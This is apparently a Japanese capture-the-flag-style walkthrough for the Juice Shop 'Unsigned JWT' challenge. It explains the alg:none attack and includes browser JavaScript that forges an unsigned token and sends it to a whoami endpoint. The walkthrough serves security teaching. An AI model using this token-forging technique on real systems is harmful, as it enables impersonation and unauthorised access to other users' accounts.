# Unsigned JWT ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** 認証
**目標:** 署名を無効化してトークンを偽造する

---

## 思考プロセス

**ステップ1: JWTの構造を理解**
```
「JWTは3つのパーツ: ヘッダー.ペイロード.署名」
    ↓
「ヘッダーには暗号化アルゴリズムが指定されている」
    ↓
「HS256, RS256 などが一般的」
    ↓
「もしアルゴリズムを "none" にしたら？」
```

**ステップ2: "none" アルゴリズム攻撃**
```
「JWTの仕様には alg: "none" が存在する」
    ↓
「これは署名なしを意味する」
    ↓
「脆弱な実装では、none を指定すると署名検証がスキップされる」
    ↓
「ペイロードを自由に改ざんできる！」
```

## 実行手順

1. まず `jwtn3d@juice-sh.op` というユーザーを登録
2. Console で以下を実行して偽造トークンを作成:
   ```javascript
   // ヘッダー: アルゴリズムを "none" に変更
   const header = btoa(JSON.stringify({
     "alg": "none",
     "typ": "JWT"
   })).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

   // ペイロード: ユーザー情報
   const payload = btoa(JSON.stringify({
     "status": "success",
     "data": {
       "id": 22,
       "email": "jwtn3d@juice-sh.op",
       "role": "customer"
     }
   })).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

   // 署名なしトークン（末尾のドットに注目）
   const fakeToken = header + '.' + payload + '.';
   console.log(fakeToken);
   ```
3. 作成したトークンを使ってリクエスト:
   ```javascript
   fetch('/rest/user/whoami', {
     headers: {'Authorization': 'Bearer ' + fakeToken}
   }).then(r => r.json()).then(console.log)
   ```

## 解説

**アルゴリズム混乱攻撃:**
- 通常、JWTは署名で改ざんを防止している
- しかし `alg: "none"` を指定すると、署名チェックがスキップされる実装がある
- ペイロードを自由に改ざんして、任意のユーザーになりすまし可能

**なぜ危険？**
- 管理者になりすまして操作可能
- 他のユーザーのデータにアクセス可能
- 署名という最重要のセキュリティ機能が無効化

## 関連チャレンジ

- [Forged Signed JWT](forged-signed-jwt.md)
- [Login Admin](../difficulty-2/login-admin.md)
